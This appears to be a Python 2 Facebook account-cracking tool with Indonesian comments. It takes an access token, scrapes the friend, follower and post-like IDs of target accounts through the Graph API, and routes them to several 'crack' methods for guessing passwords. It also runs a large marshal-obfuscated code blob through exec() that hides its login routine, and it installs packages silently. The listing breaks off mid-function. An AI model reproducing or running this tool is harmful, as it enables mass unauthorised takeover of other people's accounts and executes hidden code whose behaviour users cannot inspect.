#coding=utf-8

#Open Source Code Nih Males Gua Encrypt Palingan Di Decrypt Ama Lu :v

######################################################
#                                                    #
# Recode? Boleh                                      #
#                                                    #
# Yang Penting Link Subrek Jangan Di Ganti!          #
#                                                    #
# Created By Bii Dev, /.Bdbss, orbXD                 #
#                                                    #
# Author Asli (Bii Dev)                              #
#                                                    #
# Tipe Python2                                       #
#                                                    #
# File Name: orbxd.py                                #
#                                                    #
# Github: https://www.github.com/BiiDev              #
#                                                    #
######################################################

import marshal,zlib
import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
if 'linux' in sys.platform.lower():
    N = '\x1b[1;94m'
    G = '\x1b[1;92m'
    O = '\x1b[1;97m'
    R = '\x1b[1;91m'
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
else:
    try:
        import mechanize
    except ImportError:
        os.system('pip2 install mechanize')
    else:
        try:
            import bs4
        except ImportError:
            os.system('pip2 install bs4')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)

p = "\x1b[0;37m" # putih
o = "\x1b[0;36m" # biru muda

logo = """\033[1;37m
   ______\033[1;91m   __ __ \033[1;37m            __  
  / ____/ \033[1;91m / // /  \033[1;37m  _____   / /__
 / /      \033[1;91m/ // /_ \033[1;37m  / ___/  / //_/
/ /___   \033[1;91m/__  __/\033[1;37m  / /__   / ,< Au \033[1;36m• \033[1;32morbXD.\033[1;37m
\____/   \033[1;91m  /_/   \033[1;37m  \___/  /_/|_|\n"""

host="https://mbasic.facebook.com"
ua="Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115;]"#User-Agent REDMI 6A
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
touch_fbh={"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

m_fbh={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

graph_h={"Host":"graph.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
	
durasi = str(datetime.now().strftime('%d-%m-%Y'))

def login(): #LOGIN YANG SERING EROR KONTOL
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        print logo
        print("\033[0;96m"+50*"-")
        print ' \x1b[0;97m[\x1b[0;96m1\x1b[0;97m] Login With Token Facebook'
        print ' \x1b[0;97m[\x1b[0;96m0\x1b[0;97m] Exite Programs'
        ask = raw_input('\n \x1b[0;97m[\x1b[0;96m•\x1b[0;97m] Choose : ')
        if ask == '':
            login()
        elif ask == '1' or ask == '01':
            log_token()
        elif ask == '0' or ask == '00':
            os.sys.exit()
        else:
            login()

### AMBIL TOKEN ###
def kontolrecode():
    os.system("clear")
    print logo
    print("\033[0;96m"+50*"-")
    jalan(p+" ["+o+"•"+p+"] Open Youtube...")
    os.system("xdg-open https://youtu.be/fbD0ArCzJ0k")
    raw_input(p+" [BACK]")
    login()   


# LOGIN TOKEN METHODD:)
# Jangan Hapus Om Nanti Rusak Filenya Kalo Gak Percaya Coba Ajah :v
exec(marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\xd1\x03\x00\x00@\x00\x00\x00s\xad\x0b\x00\x00d\x00\x00d\x01\x00d\x02\x00d\x03\x00d\x04\x00d\x05\x00d\x06\x00d\x01\x00d\x07\x00d\x04\x00d\x08\x00d\t\x00d\x07\x00d\n\x00d\x0b\x00d\x0c\x00d\n\x00d\x00\x00d\r\x00d\x0b\x00d\r\x00d\x07\x00d\x08\x00d\x0e\x00d\x0f\x00d\x10\x00d\x11\x00d\x0e\x00d\x12\x00d\x0e\x00d\x13\x00d\x14\x00d\x01\x00d\x07\x00d\x04\x00d\x08\x00d\t\x00d\x07\x00d\n\x00d\x15\x00d\n\x00d\x03\x00d\x07\x00d\x16\x00d\x08\x00d\x14\x00d\x0c\x00d\n\x00d\x00\x00d\r\x00d\x15\x00d\x16\x00d\x0e\x00d\x13\x00d\x03\x00d\x01\x00d\x02\x00d\x04\x00d\x0e\x00d\x08\x00d\x08\x00d\x14\x00d\r\x00d\x07\x00d\x08\x00d\x0e\x00d\x0f\x00d\x10\x00d\x15\x00d\r\x00d\x0f\x00d\x10\x00d\x16\x00d\x0e\x00d\x13\x00d\x03\x00d\x16\x00d\x0e\x00d\x14\x00d\x17\x00d\x0e\x00d\x18\x00d\x12\x00d\x05\x00d\x19\x00d\x1a\x00d\x05\x00d\x1b\x00d\x1c\x00d\x1d\x00d\x1e\x00d\x1f\x00d \x00d!\x00d\x1a\x00d"\x00d#\x00d\x0c\x00d$\x00d\x1c\x00d#\x00d\x1d\x00d\x1c\x00d%\x00d\x02\x00d&\x00d\x1a\x00d\'\x00d\x00\x00d\x10\x00d\t\x00d\x18\x00d\x0f\x00d#\x00d(\x00d)\x00d*\x00d\x03\x00d\x0e\x00d\x05\x00d"\x00d+\x00d$\x00d\x19\x00d\x00\x00d\t\x00d\x00\x00d\t\x00d\x03\x00d\x03\x00d\t\x00d\x08\x00d\r\x00d\x04\x00d,\x00d\x18\x00d\x18\x00d-\x00d\x0e\x00d+\x00d\x0f\x00d\x0e\x00d.\x00d\x0e\x00d/\x00d\x1d\x00d\x03\x00d0\x00d1\x00d,\x00d\x05\x00d\x18\x00d2\x00d3\x00d4\x00d5\x00d6\x00d\x1d\x00d\n\x00d \x00d4\x00d\x00\x00d\x18\x00d0\x00d7\x00d/\x00d8\x00d5\x00d \x00d5\x00d\x1a\x00d\x1a\x00d\r\x00d*\x00d/\x00d$\x00d9\x00d6\x00d\t\x00d3\x00d2\x00d:\x00d(\x00d#\x00d\r\x00d1\x00d\x01\x00d5\x00d1\x00d6\x00d;\x00d)\x00d\x13\x00d<\x00d%\x00d0\x00d;\x00d\x1d\x00d/\x00d.\x00d\t\x00d=\x00d>\x00d?\x00d,\x00d@\x00d\x07\x00d\x1f\x00d\x00\x00d%\x00d\t\x00d+\x00d=\x00d\x1b\x00d\x0e\x00d6\x00d\x1e\x00d\x1f\x00d\x0f\x00d;\x00d9\x00d!\x00d3\x00d\x02\x00d3\x00d;\x00d)\x00d\x0c\x00d:\x00d$\x00d;\x00d!\x00d%\x00d3\x00d\x01\x00d\x1f\x00d\x0e\x00d5\x00d?\x00d)\x00d\x0e\x00d\x1b\x00d#\x00d\x0f\x00d\x0e\x00d:\x00d$\x00d7\x00d\x10\x00d?\x00d\x03\x00d;\x00d\x00\x00d+\x00d"\x00d>\x00d%\x00d:\x00d\x1f\x00d\x19\x00d \x00d;\x00d\x19\x00d!\x00d\x02\x00d*\x00d\x1e\x00d&\x00d\'\x00d\x19\x00d\x13\x00d?\x00d;\x00d\x0c\x00d\'\x00d;\x00d\x02\x00d>\x00d?\x00d\x0c\x00d"\x00d-\x00d<\x00d\x1c\x00d\t\x00d\x02\x00d1\x00d\x02\x00d\x1c\x00d\r\x00d;\x00d5\x00d\x0f\x00dA\x00d\x0c\x00d0\x00d%\x00d\x1e\x00d\x1c\x00d \x00d#\x00dB\x00d\n\x00dB\x00d:\x00d#\x00d\t\x00d\x00\x00d\x1d\x00d\n\x00d\n\x00d/\x00d\x1c\x00d*\x00d\x1c\x00d\x0f\x00d:\x00d5\x00d?\x00d\n\x00d%\x00dB\x00dC\x00d9\x00d\n\x00d\x10\x00dC\x00d#\x00d?\x00d/\x00d/\x00d)\x00d\x0f\x00dA\x00d\x12\x00d$\x00d@\x00dC\x00d8\x00d \x00d2\x00d\x12\x00d \x00dD\x00d\x1e\x00d?\x00d\x03\x00d&\x00d \x00d,\x00d(\x00dE\x00d\x07\x00d1\x00d\x01\x00d\x03\x00d\x03\x00d\x1f\x00d8\x00d/\x00d5\x00d)\x00dE\x00d9\x00d\x02\x00d\x16\x00d%\x00d/\x00d$\x00d2\x00d&\x00d"\x00d\x19\x00d\'\x00d\x1c\x00d\x02\x00dE\x00dD\x00d\t\x00d\x1b\x00d@\x00d\x1b\x00d\t\x00d)\x00d\x0f\x00d\x18\x00d/\x00d;\x00d*\x00d8\x00dB\x00d\x10\x00d$\x00d\x1f\x00d@\x00d\x1d\x00d\x0f\x00dB\x00dC\x00d6\x00dA\x00d0\x00d\x0c\x00d1\x00d9\x00d\x12\x00d2\x00d8\x00dA\x00d\x1a\x00d\x12\x00d)\x00d\x13\x00d\x1e\x00d\x08\x00d(\x00d\x08\x00d*\x00d5\x00d9\x00d;\x00d-\x00dC\x00dD\x00d&\x00d)\x00d\x16\x00d9\x00d\x01\x00d\x00\x00d\x0e\x00d:\x00d=\x00d\t\x00d\x02\x00d\x1e\x00d2\x00d\x00\x00d#\x00d*\x00d\x1c\x00d>\x00d-\x00dB\x00d&\x00d!\x00d4\x00d,\x00dE\x00d\x1a\x00d\x03\x00d5\x00d\t\x00d7\x00d4\x00d\x1f\x00d\x16\x00d\x04\x00d2\x00d\x07\x00d\x1b\x00d5\x00d\x05\x00dB\x00d-\x00dD\x00d\x18\x00d-\x00d\'\x00dE\x00d\x0c\x00d+\x00d!\x00d+\x00d\x0e\x00d\x16\x00d\x12\x00d,\x00d:\x00d\x07\x00d \x00d=\x00dD\x00dD\x00d\x1d\x00d\x05\x00dE\x00d\x13\x00d\r\x00dD\x00d@\x00d\x05\x00d+\x00d&\x00d\x0c\x00d6\x00d\r\x00d\x05\x00d,\x00d\x04\x00d\x04\x00d\x19\x00d$\x00d\x1d\x00d*\x00d\x04\x00d8\x00dE\x00d<\x00d\n\x00d1\x00dC\x00d/\x00d+\x00d>\x00d.\x00d9\x00dA\x00d$\x00d.\x00d8\x00d:\x00d*\x00d<\x00d<\x00d)\x00d"\x00d8\x00d\x1a\x00d3\x00d;\x00d@\x00d\x0e\x00d<\x00d\x08\x00dC\x00d?\x00d8\x00d;\x00d#\x00d@\x00d=\x00d!\x00d\x01\x00dA\x00d>\x00d.\x00d\x1f\x00d.\x00d4\x00d7\x00d\x05\x00d!\x00d\x0f\x00d-\x00d\x0f\x00d\n\x00d\t\x00d\x07\x00d:\x00d\n\x00d5\x00d5\x00d!\x00d\t\x00d8\x00dA\x00d7\x00d!\x00d\n\x00d*\x00d&\x00d\x05\x00d<\x00d\x19\x00dC\x00d\x03\x00d\x1a\x00d-\x00d+\x00d\x0c\x00d\x1c\x00d\x05\x00d6\x00d\x08\x00d&\x00d8\x00d\x04\x00d\x0e\x00d0\x00dC\x00d\x05\x00d*\x00d\x00\x00d?\x00d\x18\x00d\x01\x00d\x10\x00d\x02\x00d\'\x00dB\x00dE\x00d0\x00d4\x00d\x05\x00d\x05\x00d1\x00d\x07\x00d#\x00d\x16\x00d\x08\x00d\r\x00d\x16\x00d;\x00dC\x00d4\x00d\r\x00d\x01\x00d&\x00d\x04\x00d7\x00d\'\x00d2\x00d\x19\x00d=\x00dE\x00d\x16\x00d\x05\x00d"\x00d\x19\x00d\x0c\x00d>\x00d\x1d\x00d>\x00d\r\x00d7\x00d\'\x00d\x1f\x00d#\x00d.\x00d%\x00d\x0c\x00d\x1f\x00dE\x00d4\x00d \x00d\x16\x00d\n\x00d\x1d\x00d\x0c\x00d5\x00d\x08\x00d=\x00d\x1f\x00d\x1e\x00d\x18\x00d\'\x00d\x0f\x00d\x00\x00d\'\x00d\x00\x00d7\x00d\x00\x00d\x19\x00d\x05\x00d3\x00d\r\x00d8\x00d\x07\x00d8\x00d\x13\x00d\x1d\x00d\x1a\x00d\x12\x00d:\x00d\x18\x00d\x1d\x00d?\x00d6\x00d1\x00d6\x00d!\x00d$\x00dC\x00dA\x00dA\x00d\x03\x00d\x13\x00d\x0f\x00d\r\x00d\x03\x00d\r\x00d\x00\x00d\x03\x00d\x1f\x00d,\x00d\x02\x00d\'\x00d\x12\x00d\x19\x00d\x05\x00d\x1e\x00d8\x00d!\x00d+\x00d\x02\x00dB\x00d9\x00d>\x00d\x10\x00d:\x00d$\x00d!\x00d\x10\x00d:\x00d\x0c\x00d\x07\x00d.\x00d=\x00d\x16\x00d\x02\x00d\x08\x00d%\x00d#\x00d\x1e\x00d\x1c\x00dA\x00d\x16\x00dE\x00d&\x00d\x08\x00d+\x00d\x08\x00d\x1e\x00d+\x00d)\x00dB\x00d3\x00d,\x00d0\x00dC\x00d/\x00d\x0f\x00d!\x00d\x1e\x00d4\x00d\x1c\x00d\'\x00d0\x00d-\x00d\x19\x00dE\x00d\x0c\x00d-\x00d"\x00d\x1a\x00d6\x00d"\x00d,\x00d\x10\x00d\'\x00dC\x00d0\x00d\x00\x00dE\x00d>\x00d-\x00d@\x00d:\x00dD\x00d\x05\x00d\x03\x00d*\x00d\x00\x00d\x1a\x00d\n\x00d,\x00d)\x00d\x0c\x00dB\x00d/\x00d3\x00d\x05\x00d)\x00d \x00d\x1d\x00d1\x00d<\x00d\x0f\x00d.\x00d&\x00d:\x00d\x1a\x00d8\x00d/\x00d*\x00d\x1f\x00dD\x00d\x02\x00d\x05\x00d\'\x00d2\x00d#\x00d\x1d\x00d\x07\x00d\x04\x00d\x12\x00dC\x00d/\x00d\x0c\x00d:\x00d\x02\x00d<\x00d7\x00d@\x00d\t\x00dE\x00d&\x00dD\x00d\x08\x00d\x16\x00d:\x00d\x03\x00d\x1b\x00d,\x00d)\x00d@\x00d"\x00d;\x00d7\x00d\x1f\x00d\x12\x00d\x00\x00d5\x00dE\x00dB\x00d2\x00d=\x00d\x16\x00d;\x00d#\x00d\x03\x00d%\x00d@\x00d3\x00d)\x00d#\x00d&\x00d\x07\x00d\x05\x00d5\x00dB\x00d\x1d\x00d\x07\x00d\x07\x00d\x13\x00d\r\x00d!\x00d0\x00d\x10\x00dE\x00dD\x00d4\x00dC\x00d\x1a\x00d@\x00d!\x00d\x05\x00d\x1e\x00d\x1a\x00d\x10\x00d\x03\x00d@\x00d\r\x00d*\x00d4\x00d)\x00d\x1d\x00d5\x00d&\x00d(\x00d \x00d4\x00d\x0f\x00d=\x00d\t\x00d(\x00d<\x00d\x08\x00d1\x00d\n\x00d0\x00d\t\x00d\x18\x00d\x02\x00d\x05\x00d \x00dA\x00d@\x00d\x05\x00d\x05\x00d+\x00dA\x00d7\x00d@\x00d7\x00d\x18\x00d\x12\x00d\n\x00d\x01\x00d\x13\x00d\x04\x00d\r\x00d\x18\x00d\x01\x00d&\x00d8\x00d0\x00d&\x00d-\x00d#\x00d\x04\x00d+\x00d\x1c\x00d \x00d>\x00d\x18\x00d*\x00d"\x00d\x01\x00d%\x00dC\x00d,\x00d\x10\x00dE\x00d\x08\x00d\x02\x00d\x1e\x00d\x03\x00d\t\x00d5\x00d\x1d\x00d\'\x00dD\x00d\x1d\x00d\x1d\x00d\x10\x00d\x03\x00d\x1f\x00d"\x00d3\x00d\x0e\x00d\x12\x00d\x1e\x00d\x07\x00d\x01\x00d%\x00d-\x00d\x02\x00dB\x00d\x0c\x00d\x03\x00d\x0f\x00d\x08\x00d\'\x00d9\x00d?\x00d8\x00d\x16\x00d:\x00d0\x00d2\x00d\x17\x00dF\x00dF\x00dF\x00dF\x00g\xd1\x03Z\x00\x00dG\x00j\x01\x00g\x00\x00e\x00\x00D]\x18\x00Z\x02\x00e\x03\x00e\x04\x00e\x02\x00\x83\x01\x00\x83\x01\x00^\x02\x00q\x86\x0b\x83\x01\x00dH\x00\x04UdH\x00S(I\x00\x00\x00ti\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tm\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tp\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555to\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tr\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tt\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555t \x00\x00\x0055555555555555555555555555555555ta\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555ts\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555th\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tl\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555t,\x00\x00\x0055555555555555555555555555555555555555555555tz\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tb\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555te\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555t6\x00\x00\x00555555555555555555555555555555555555555555555555555555t4\x00\x00\x005555555555555555555555555555555555555555555555555555t\n\x00\x00\x005555555555tx\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tc\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555t(\x00\x00\x005555555555555555555555555555555555555555t.\x00\x00\x005555555555555555555555555555555555555555555555td\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555t"\x00\x00\x005555555555555555555555555555555555tJ\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555tU\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555555t3\x00\x00\x00555555555555555555555555555555555555555555555555555tL\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555tG\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555t0\x00\x00\x00555555555555555555555555555555555555555555555555tE\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555tQ\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555tn\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555t8\x00\x00\x0055555555555555555555555555555555555555555555555555555555tD\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555tR\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555tT\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555555tk\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tV\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555555t/\x00\x00\x0055555555555555555555555555555555555555555555555t+\x00\x00\x005555555555555555555555555555555555555555555tF\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555t2\x00\x00\x0055555555555555555555555555555555555555555555555555t7\x00\x00\x005555555555555555555555555555555555555555555555555555555tf\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tX\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555555555t1\x00\x00\x005555555555555555555555555555555555555555555555555tY\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tC\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555tB\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555tS\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555tj\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555t9\x00\x00\x00555555555555555555555555555555555555555555555555555555555tZ\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tP\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555ty\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tW\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tw\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tO\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555tg\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tI\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555t5\x00\x00\x0055555555555555555555555555555555555555555555555555555tq\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tA\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555tK\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555tM\x00\x00\x0055555555555555555555555555555555555555555555555555555555555555555555555555555tH\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555tN\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555tu\x00\x00\x00555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555tv\x00\x00\x005555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555t)\x00\x00\x0055555555555555555555555555555555555555555t\x00\x00\x00\x00N(\x05\x00\x00\x00t\x01\x00\x00\x00dt\x04\x00\x00\x00joint\x01\x00\x00\x00it\x03\x00\x00\x00chrt\x03\x00\x00\x00len(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x05\x00\x00\x00<roy>t\x08\x00\x00\x00<module>\x07\x00\x00\x00s\x18\x00\x00\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\xff\x00\x84\x00'))#ENCRYPT By BiiDev, Github: https://www.github.com/BiiDev

#MENU CRACK, DUMP ID  
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nama = a['first_name']
    id = a['id']
  except Exception as e:
    print (" Error : %s"%e).format(R,N)
    time.sleep(1)
    login()
  os.system("clear")
  print logo
  print("\033[0;96m"+50*"-")
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Your Name    : \033[1;32m"+nama)
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Your ID      : \033[1;32m"+id)
  print("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Your Joined  : \033[1;32m"+durasi)
  print("\033[0;96m"+50*"-")
  print("\033[0;96m\033[0;97m [\033[1;36m1\033[1;37m] Crack ID From Friendlist/Public")
  print("\033[0;96m\033[0;97m [\033[1;36m2\033[1;37m] Crack ID From Followers")
  print("\033[0;96m\033[0;97m [\033[1;36m3\033[1;37m] Crack ID From Likes")
  print("\033[0;96m\033[0;97m [\033[1;36m4\033[1;37m] Cek Result Crack")
  print("\033[0;96m\033[0;97m [\033[1;36m5\033[1;37m] Update Script Premuim (\033[1;36mFree\033[1;37m)")
  print("\033[0;96m\033[0;97m [\033[1;36m0\033[1;37m] Logout")
  print ""
  r=raw_input("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Choose: ")
  if r=="":print("\033[0;97m [!] isi Yang Benar").format(R,N);menu()
  elif r=="1":
      publik()
  elif r=="2":
      followers()
  elif r=="3":
      likes()
  elif r=="4":
      ress()
  elif r=="5":
      print "\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Tembuskan 300 Subrek Dulu Baru Gua Rilis Scnya :v"
      time.sleep(3.7)
      menu()
  elif r=="0":
    try:
      os.remove("login.txt")
    except Exception as e:print("\033[0;97m [!] Eror file tidak ditemukan %s"%e)
  else:
    print (" [!] SALAH ANJING!").format(R,N);menu()

def methode(file):
    time.sleep(1.5)
    print '\n\x1b[0;97m [ \x1b[1;36mPilih Metode Crack\x1b[1;37m ]'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m1\x1b[1;37m] Crack With Mbasic.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m2\x1b[1;37m] Crack With M.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m3\x1b[1;37m] Crack With Touch.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m4\x1b[1;37m] Crack With Api.Facebook'
    print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m5\x1b[1;37m] Crack With Free.Facebook'
    print ''
    sek = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Choose: ')
    if sek == '':
        print ('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah').format(R, N)
        methode(file)
    elif sek == '1' or sek =="01":
        crack(file)
    elif sek == '2' or sek =="02":
        crack1(file)
    elif sek == '3' or sek =="03":
        crack2(file)
    elif sek == '4' or sek =="04":
        crack3(file)
    elif sek == '5' or sek =="05":
        freefb(file)
    else:
        print ('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Keyword Salah!').format(R, N)
        methode()

def publik():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        os.sys.exit()
    try:
        print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type \'me\' Crack From Friendlist"
        idt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User ID Target: ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
        except KeyError:
            print (' [!] ID Tidak Di Temukan!').format('R')
            menu()
        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Getting ID ...'
        qq = (op["first_name"]+".json").replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
        ys.close()
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total ID: %s' % len(id)
        return methode(qq)
    except Exception as e:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Error: %s' % e)

def followers():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        os.sys.exit()
    try:
        print "\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Type \'me\' Crack From Your Followers "
        idt = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] User ID Target: ')
        try:
            pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            sp = json.loads(pok.text)
            print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Name : "+sp["name"])
        except KeyError:
            print (' [!] ID Tidak Di Temukan!').format('R')
            menu()
        r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
        z=json.loads(r.text)
        id = []
        qq = (sp["first_name"]+".json").replace(" ","_")
        ys = open(qq , "w")#.replace(" ","_")
        for a in z["data"]:
            id.append(a["id"]+"<=>"+a["name"])
            ys.write(a["id"]+"<=>"+a["name"]+"\n")
        ys.close()
        print('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Total ID: '+str(len(id)))
        return methode(qq)
    except Exception as e:
        exit('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Error: %s' % e)
def likes():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        os.sys.exit()
    try:
        idt = raw_input('\n\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] ID Post Target: ')
        try:
            pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            sp = json.loads(pok.text)
            print("\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Name : "+sp["name"])
        except KeyError:
            print (' [!] ID Tidak Di Temukan!').format('R')
            menu()
